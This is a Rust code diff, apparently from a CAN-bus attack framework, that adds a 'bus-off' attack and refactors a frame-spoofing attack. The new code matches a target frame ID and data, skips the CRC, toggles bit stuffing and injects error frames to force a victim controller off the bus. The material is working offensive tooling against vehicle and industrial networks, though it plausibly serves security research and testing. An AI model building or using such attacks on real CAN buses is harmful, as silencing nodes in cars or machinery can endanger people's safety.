@@ -15,6 +15,11 @@ pub enum PredefAttacks {
     CustomAttack {
         commands: Vec<HighLevelAttackCmd, MAX_HL_COMMANDS>,
     },
+    BusOffAttack {
+        id: Id,
+        match_data: Vec<u8, 8>,
+        errors: usize,
+    },
 }
 
 impl<const OUT_SIZE: usize> Buildable<OUT_SIZE> for PredefAttacks {
@@ -31,6 +36,11 @@ impl<const OUT_SIZE: usize> Buildable<OUT_SIZE> for PredefAttacks {
             PredefAttacks::CustomAttack { ref commands } => {
                 self.build_custom_attack(out_vec, &commands)
             }
+            PredefAttacks::BusOffAttack {
+                id,
+                ref match_data,
+                errors,
+            } => self.build_bus_off_attack(out_vec, id, match_data, *errors),
         }
     }
 }
@@ -48,11 +58,10 @@ impl PredefAttacks {
         Ok(commands.len())
     }
 
-    fn build_spoofing_attack<const SIZE: usize>(
+    fn build_match_id_and_data<const SIZE: usize>(
         &self,
         hl_attack: &mut Vec<HighLevelAttackCmd, SIZE>,
         id: &Id,
-        spoof_data: &Vec<u8, 8>,
         match_data: &Vec<u8, 8>,
     ) -> Result<usize, BuildError> {
         // Match the target ID
@@ -79,7 +88,21 @@ impl PredefAttacks {
             })
             .unwrap();
 
+        Ok(2)
+    }
+
+    fn build_spoofing_attack<const SIZE: usize>(
+        &self,
+        hl_attack: &mut Vec<HighLevelAttackCmd, SIZE>,
+        id: &Id,
+        spoof_data: &Vec<u8, 8>,
+        match_data: &Vec<u8, 8>,
+    ) -> Result<usize, BuildError> {
         // Wait for the end of the frame
+        let attack_size = self
+            .build_match_id_and_data(hl_attack, id, match_data)
+            .unwrap();
+
         hl_attack.push(HighLevelAttackCmd::WaitBusFree).unwrap();
         // Send the actual message
         let mut data = [0; 8];
@@ -96,7 +119,48 @@ impl PredefAttacks {
             })
             .unwrap();
 
-        Ok(6)
+        // WaitBusFree + SendMsg
+        Ok(attack_size + 2)
+    }
+
+    fn build_bus_off_attack<const SIZE: usize>(
+        &self,
+        hl_attack: &mut Vec<HighLevelAttackCmd, SIZE>,
+        id: &Id,
+        match_data: &Vec<u8, 8>,
+        errors: usize,
+    ) -> Result<usize, BuildError> {
+        // Wait for the end of the frame
+        let attack_size = self
+            .build_match_id_and_data(hl_attack, id, match_data)
+            .unwrap();
+
+        // Skip CRC (15 bits)
+        hl_attack
+            .push(HighLevelAttackCmd::Wait { bits: 15 })
+            .unwrap();
+
+        // The last part of the message hasn't bitstuffing
+        hl_attack
+            .push(HighLevelAttackCmd::SetBitstuffing { state: false })
+            .unwrap();
+
+        // Wait until EOF1 ends (CRC Del, ACK, ACK Del, [EoF6 - EoF1])
+        hl_attack
+            .push(HighLevelAttackCmd::Wait { bits: 9 })
+            .unwrap();
+
+        // Enable bitstuffing again
+        hl_attack
+            .push(HighLevelAttackCmd::SetBitstuffing { state: true })
+            .unwrap();
+
+        // Send error to break the message
+        hl_attack
+            .push(HighLevelAttackCmd::SendError { count: errors })
+            .unwrap();
+
+        Ok(attack_size + 5)
     }
 
     fn build_test_attack<const SIZE: usize>(
